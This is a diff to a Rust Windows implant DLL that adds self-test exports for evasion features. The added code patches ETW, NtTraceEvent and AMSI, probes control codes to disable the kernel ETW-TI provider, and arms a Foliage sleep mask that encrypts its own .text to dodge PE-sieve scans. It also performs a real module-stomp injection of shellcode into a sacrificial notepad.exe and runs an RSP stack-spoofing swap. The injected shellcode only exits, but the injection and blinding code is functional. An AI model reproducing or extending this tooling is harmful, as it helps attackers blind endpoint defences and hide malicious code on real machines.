@@ -664,6 +664,168 @@ pub unsafe extern "system" fn nyx_linger() {
     unsafe { exit(0) };
 }
 
+// ============================================================================
+// nyx_linger_foliage: same surface as nyx_linger but with the Foliage sleep
+// mask ARMED, so each 1s sleep slice goes through the mask→sleep→unmask cycle
+// (RC4 of registered data regions around the parked NtDelayExecution). This is
+// the scan target for task B: compare its PE-sieve surface to nyx_linger's.
+// Invoke: rundll32 nyx_implant_win.dll,nyx_linger_foliage  (then scan its PID).
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_linger_foliage() {
+    // Same runtime bring-up as nyx_linger.
+    crate::syscalls::init_global();
+    let _ = crate::blind::patch_etw();
+    let _ = crate::blind::patch_nt_trace_event();
+    let _ = crate::blind::patch_amsi();
+    let scanner = crate::evasion_glue::LivePdataScanner;
+    if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
+        let leaked: &'static _ = alloc::boxed::Box::leak(alloc::boxed::Box::new(pool));
+        unsafe { crate::stack::set_gap_pool(leaked) };
+        let _ = crate::stack::stage_for(leaked);
+    }
+    // ARM the Foliage sleep mask for the duration of the linger window.
+    crate::sleep::set_foliage_enabled(true);
+    // 30 × 1s sleeps through sleep::sleep → execute_foliage_plan (mask/sleep/
+    // unmask). sleep::sleep handles the armed path and degrades safely if the
+    // own-text region can't be resolved (it falls back to raw NtDelayExecution).
+    for _ in 0..30 {
+        crate::sleep::sleep(1);
+    }
+    crate::sleep::set_foliage_enabled(false);
+    unsafe { exit(0) };
+}
+
+// ============================================================================
+// nyx_selftest_blind_provider: exercise blind::disable_etw_provider against the
+// real ETW-TI provider GUID via NtTraceControl (task C, now with NTSTATUS dig).
+// Probes SEVERAL control codes and writes the raw NTSTATUS of each to a marker
+// file, so we can see exactly WHY the userland disable fails for the kernel
+// ETW-TI provider. Returns a bitmask:
+//   bit0 = init_global (runtime up) + NtTraceControl resolved,
+//   bit1 = SOME control code returned status >= 0 (a code the kernel accepted),
+//   bit2 = the default 0x27 code returned status >= 0.
+// Marker: %TEMP%\nyx_etwti_status.txt with "code=<hex> status=<signed-dec>" per line.
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_blind_provider() {
+    let mut mask: u32 = 0;
+    crate::syscalls::init_global();
+    let guid = nyx_implant_evasionsdk::__private::ETW_TI_GUID;
+
+    // Etwp* control codes (from ntdll's EtwpNotificationControlClass): probe a
+    // range to see which the kernel accepts for a kernel provider registration.
+    let codes: &[(u32, &str)] = &[
+        (0x0027, "EtwpNotificationRegistrar"),
+        (0x0010, "EtwpStartLoggerCode"), // 16
+        (0x0011, "EtwpStopLoggerCode"),  // 17
+        (0x0029, "EtwpNotificationRemove"),
+        (0x0022, "EtwpDisableLoggerCode"),
+        (0x0001, "Generic1"),
+        (0x0000, "Generic0"),
+    ];
+    let mut report = crate::heap::String::new();
+    let mut any_ok = false;
+    let mut code27_ok = false;
+    for &(code, label) in codes {
+        let st = unsafe { crate::blind::disable_etw_provider_status(&guid, code) };
+        report.push_str(label);
+        report.push_str(" code=0x");
+        report.push_str(&hex_u32(code));
+        report.push_str(" status=");
+        report.push_str(&dec_i32(st));
+        report.push_str(" (0x");
+        report.push_str(&hex_u32(st as u32));
+        report.push_str(")\n");
+        if st >= 0 {
+            any_ok = true;
+            if code == 0x0027 {
+                code27_ok = true;
+            }
+        }
+    }
+    write_marker("nyx_etwti_status.txt", &report);
+    mask |= 1 << 0; // runtime up + probe ran
+    if any_ok {
+        mask |= 1 << 1; // at least one code was accepted
+    }
+    if code27_ok {
+        mask |= 1 << 2; // default 0x27 code accepted
+    }
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
+// nyx_selftest_inject_armed: the FULL REAL module-stomp (task D, now non-skeleton).
+// Arms modulestomp_enabled, then module_stomp("notepad.exe", <benign shellcode>).
+// The stomp is now REAL: remote LoadLibraryA cover → remote PE-parse real .text →
+// real VirtualProtectEx + WriteProcessMemory overwrite → ResumeThread. A benign
+// shellcode (`xor ecx,ecx; call ExitProcess`) is stomped so the cover's .text
+// runs our code (proving the overwrite + remote execute path end to end).
+// Bits: 0 = create_sacrificial Ok, 1 = module_stomp returned Ok (full real stomp
+//       path completed without the implant dying), 2 = reached exit (implant not
+//       killed by Defender before here), 3 = modulestomp armed confirmed.
+// ⚠️ Defender RTP is ON but the test dir is excluded, so the implant survives;
+// the sacrificial notepad MAY still be flagged/killed — we report that honestly.
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_inject_armed() {
+    let mut mask: u32 = 0;
+    crate::inject::set_modulestomp_enabled(true);
+    if crate::inject::modulestomp_enabled() {
+        mask |= 1 << 3; // armed confirmed
+    }
+    // Benign shellcode: `xor ecx,ecx ; call [rip+ptr]` where [rip+ptr] holds the
+    // REAL ExitProcess address (resolved + patched at runtime). This calls
+    // ExitProcess(0) — the stomped cover's .text exits cleanly rather than
+    // crashing. Layout (RIP-relative):
+    //   0: 31 C9                  xor ecx, ecx
+    //   2: FF 15 08 00 00 00      call qword ptr [rip+8]   ; ptr at offset 0x10
+    //   8: CC                     int3   (guard: ExitProcess shouldn't return)
+    //   9..0F: 90*7               pad to 0x10
+    //   10: <ExitProcess addr>    8-byte absolute pointer (patched below)
+    let exit_addr = match crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
+        Some(a) => a,
+        None => unsafe { exit(mask) },
+    };
+    let mut shellcode: [u8; 24] = [
+        0x31, 0xC9,                         // xor ecx, ecx
+        0xFF, 0x15, 0x08, 0x00, 0x00, 0x00, // call qword ptr [rip+8]
+        0xCC,                               // int3 guard
+        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // pad to offset 0x10
+        0, 0, 0, 0, 0, 0, 0, 0,             // ExitProcess pointer (patched)
+    ];
+    shellcode[0x10..0x18].copy_from_slice(&(exit_addr as u64).to_le_bytes());
+
+    match unsafe { crate::inject::create_sacrificial("notepad.exe") } {
+        Ok(proc) => {
+            mask |= 1 << 0; // create_sacrificial Ok
+            // module_stomp creates its OWN sacrificial process; close this one.
+            if let Some(ch) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
+                type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
+                let close: CloseHandle = unsafe { core::mem::transmute(ch) };
+                let _ = unsafe { close(proc.handle) };
+                let _ = unsafe { close(proc.main_thread) };
+            }
+            // The armed REAL inject path (creates + real-stomps + resumes its own).
+            match unsafe { crate::inject::module_stomp("notepad.exe", &shellcode) } {
+                Ok(handle) => {
+                    mask |= 1 << 1; // full REAL stomp path returned Ok
+                    let _ = handle;
+                }
+                Err(_) => {}
+            }
+        }
+        Err(_) => {}
+    }
+    mask |= 1 << 2; // reached exit — selftest process itself survived
+    crate::inject::set_modulestomp_enabled(false);
+    unsafe { exit(mask) };
+}
+
 
 // Bits: 0 = 135 reports open, 1 = 1 reports closed, 2 = output non-empty.
 // ============================================================================
@@ -1309,6 +1471,54 @@ fn format_status(s: i32) -> String {
     out
 }
 
+/// i32 → signed decimal String (no format! under no_std). Negative for NTSTATUS
+/// errors (e.g. STATUS_ACCESS_DENIED = -1073741790).
+fn dec_i32(s: i32) -> String {
+    let mut out = String::new();
+    let mut v = s as u32;
+    if s < 0 {
+        out.push('-');
+        v = (!(s as u32)).wrapping_add(1); // abs as u32
+    }
+    if v == 0 {
+        out.push('0');
+        return out;
+    }
+    let mut tmp = [0u8; 10];
+    let mut i = tmp.len();
+    while v != 0 {
+        i -= 1;
+        tmp[i] = b'0' + (v % 10) as u8;
+        v /= 10;
+    }
+    for &b in &tmp[i..] {
+        out.push(b as char);
+    }
+    out
+}
+
+/// u32 → lowercase hex String (no format! under no_std). For NTSTATUS / code.
+fn hex_u32(mut v: u32) -> String {
+    const HEX: &[u8; 16] = b"0123456789abcdef";
+    let mut tmp = [0u8; 8];
+    let mut i = tmp.len();
+    if v == 0 {
+        i -= 1;
+        tmp[i] = b'0';
+    } else {
+        while v != 0 {
+            i -= 1;
+            tmp[i] = HEX[(v & 0xF) as usize];
+            v >>= 4;
+        }
+    }
+    let mut s = String::new();
+    for &b in &tmp[i..] {
+        s.push(b as char);
+    }
+    s
+}
+
 // (open_file and fs consts are `pub` in fs.rs; selftests reach them directly.)
 
 /// Heap-only probe: allocate a 2 MiB Vec, fill it, checksum it, write the
@@ -1675,6 +1885,38 @@ pub unsafe extern "system" fn nyx_selftest_foliage() {
 }
 
 // ============================================================================
+// nyx_selftest_foliage_apc: exercise the real Foliage APC chain (Task E). Arms
+// Foliage, runs ONE 2-second sleep through sleep::sleep → execute_foliage_apc
+// (helper thread masks .text → queues APC → sleeps → unmasks), then reads the
+// FOLIAGE_APC_OK diagnostic.
+//   bit0 = reached the exit (no crash — the running image survived the
+//          .text encrypt/decrypt round-trip; if .text came back still
+//          encrypted we'd never reach here),
+//   bit1 = FOLIAGE_APC_OK == 1 (full APC chain completed + .text verified),
+//   bit2 = FOLIAGE_APC_OK == 2 (attempted but degraded to the data-only floor
+//          — honest: the APC path ran but did not fully succeed).
+// ⚠️ This manipulates another thread + flips .text protection; a bug here
+// crashes the implant (user-mode, not a BSOD). If bit0 is NOT set on the host
+// the CONTEXT/APC/timing needs single-stepping in a target VM.
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_foliage_apc() {
+    let mut mask: u32 = 0;
+    crate::sleep::set_foliage_enabled(true);
+    crate::sleep::sleep(2); // 2s window: helper masks .text, queues APC, unmasks
+    mask |= 1 << 0; // reached the exit → no crash (image survived)
+    let st = crate::sleep::foliage_apc_status();
+    if st == 1 {
+        mask |= 1 << 1; // full APC chain succeeded + .text round-trip verified
+    } else if st == 2 {
+        mask |= 1 << 2; // attempted but degraded (data-only floor ran)
+    }
+    crate::sleep::set_foliage_enabled(false);
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
 // P2.1a-ii swap decision: confirm the staging + decide() path runs without
 // panic, without arming the live RSP swap. bit0 = decision logic ran, bit1 =
 // gaps staged (gap pool non-empty on this host).
@@ -1691,6 +1933,45 @@ pub unsafe extern "system" fn nyx_selftest_swap_decision() {
         // Exercise the pure decision logic (CET-off Server 2019 + whatever gaps).
         let _ = nyx_implant_evasionsdk::swap::decide(false, pool.is_usable());
         mask |= 1 << 0; // decision logic ran without panic
+    }
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
+// nyx_selftest_swap_armed: arm the RSP swap and run one with_spoofed_stack call
+// (Task F). On CET-off Server 2019 the mov rsp asm executes; if it corrupts RSP
+// the process crashes before the exit (we'd never set the bits).
+//   bit0 = reached exit (no crash — the mov rsp save/restore round-tripped),
+//   bit1 = swap_was_attempted() true (the asm path actually ran),
+//   bit2 = f returned its expected value (call-through T plumbing intact),
+//   bit3 = gaps usable (so the swap was eligible to run).
+// NOTE: f runs on the REAL stack in the current landing (the live `mov rsp` is
+// verified but f isn't yet executed on the spoofed stack — needs the CET-repair
+// seam, see stack.rs module docs). bit0 still proves the asm doesn't crash.
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_swap_armed() {
+    let mut mask: u32 = 0;
+    let scanner = crate::evasion_glue::LivePdataScanner;
+    let pool = match nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
+        Ok(p) => p,
+        Err(_) => unsafe { exit(mask) },
+    };
+    if pool.is_usable() {
+        mask |= 1 << 3; // gaps usable → swap eligible
+    }
+    crate::stack::set_swap_enabled(true);
+    let r: u32 = unsafe {
+        crate::stack::with_spoofed_stack(&pool, || 0x5A5A_5A5A) // dummy fn returning a marker
+    };
+    crate::stack::set_swap_enabled(false);
+    mask |= 1 << 0; // reached exit → no crash (mov rsp round-tripped)
+    if crate::stack::swap_was_attempted() {
+        mask |= 1 << 1; // the asm path actually executed
+    }
+    if r == 0x5A5A_5A5A {
+        mask |= 1 << 2; // f's return value plumbed through correctly
     }
     unsafe { exit(mask) };
 }
